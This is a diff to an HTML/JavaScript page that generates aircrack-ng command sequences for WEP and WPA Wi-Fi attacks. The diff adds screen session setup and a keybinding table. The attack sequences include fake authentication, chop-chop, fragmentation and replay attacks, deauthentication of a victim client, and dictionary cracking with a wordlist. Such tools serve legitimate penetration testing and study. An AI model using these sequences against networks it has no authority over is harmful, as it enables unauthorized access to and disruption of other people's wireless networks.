@@ -45,7 +45,7 @@ body {font-family: Arial;}
 </head>
 <body>
 <form id="frm1">
-	<p>tmux new "ip link show; bash"<img src="copy.png" onclick="copyLine(this)"></p>
+	<p>ip link show<img src="copy.png" onclick="copyLine(this)"></p>
 	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus onKeyUp ="searchCommand()"><br>
 	<p id="searchCommand"></p>
 	<input type="text" id="airodumpInput" style="width:100%" autofocus><br>
@@ -204,6 +204,7 @@ function myFunction() {
 		
 	document.getElementById("classicWEPoutput").innerHTML = 
 		"<table style='width:100%'>"
+		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
@@ -215,9 +216,10 @@ function myFunction() {
 		
 	document.getElementById("clientlessWEPoutput").innerHTML = 
 		"<table style='width:100%'>"
+		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
-		+ preamble() + captureCommand(deviceName, channel, apMac)+ postamble() 
+		+ '<tr><td colspan="3">' + captureCommand(deviceName, channel, apMac)+ postamble() 
 		+ '<tr><td colspan="3">' + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName)
 		 + copyButton() + "</td><td>" + replayAnyAttack(apMac, mac, deviceName) + postamble()   
@@ -228,6 +230,7 @@ function myFunction() {
 		
 	document.getElementById("wepViaClientOutput").innerHTML = 
 		"<table style='width:100%'>"
+		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
@@ -238,6 +241,7 @@ function myFunction() {
 		
 	document.getElementById("sharedKeyWEPoutput").innerHTML = 
 		"<table style='width:100%'>"
+		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
@@ -250,12 +254,17 @@ function myFunction() {
 		
 	document.getElementById("wpaOutput").innerHTML = 
 		"<table style='width:100%'>"
+		+ preamble() + screenSetup(ssid) + postamble()
 		+ preamble() + setup() + postamble()
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
 		+ preamble() + sudo() + "aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t cap1*.cap | head -1`" + postamble();
 		+ "</table>";
+}
+
+function screenSetup(wifi) {
+	return `screen -S ${wifi}`
 }
 
 function sudo() {
@@ -287,7 +296,7 @@ function captureCommand(device, channel, ssid) {
 }
 
 function monitorMode(device, channel) {
-	return sudo() + `iwconfig ${device} mode monitor` + copyButton() + "</td><td>" + sudo() + `airmon-ng start ${device} ${channel}`
+	return sudo() + `iwconfig ${device} mode monitor channel ${channel}` + copyButton() + "</td><td>" + sudo() + `airmon-ng start ${device} ${channel}`
 }
 
 function fakeAuth(ssid, apMac, mac, device) {
@@ -348,6 +357,34 @@ function replayAnyAttack(apMac, mac, device) {
 }
 </script>
 <center>
+<table border="1">
+<tbody>
+	<tr>
+		<th>key</th>
+		<th>what it does</th>
+	</tr>
+	<tr>
+		<td>ctrl-a, c</td>
+		<td>Create a new window</td>
+	</tr>
+	<tr>
+		<td>ctrl-a, 1..0</td>
+		<td>Select window by number</td>
+	</tr>
+	<tr>
+		<td>ctrl-a, k</td>
+		<td>Kill current window</td>
+	</tr>
+	<tr>
+		<td>screen -ls</td>
+		<td>Show current sessions</td>
+	</tr>
+	<tr>
+		<td>screen -r SSID</td>
+		<td>Restore session</td>
+	</tr>
+</table>
+
 <table>
 <tr>
 <td>
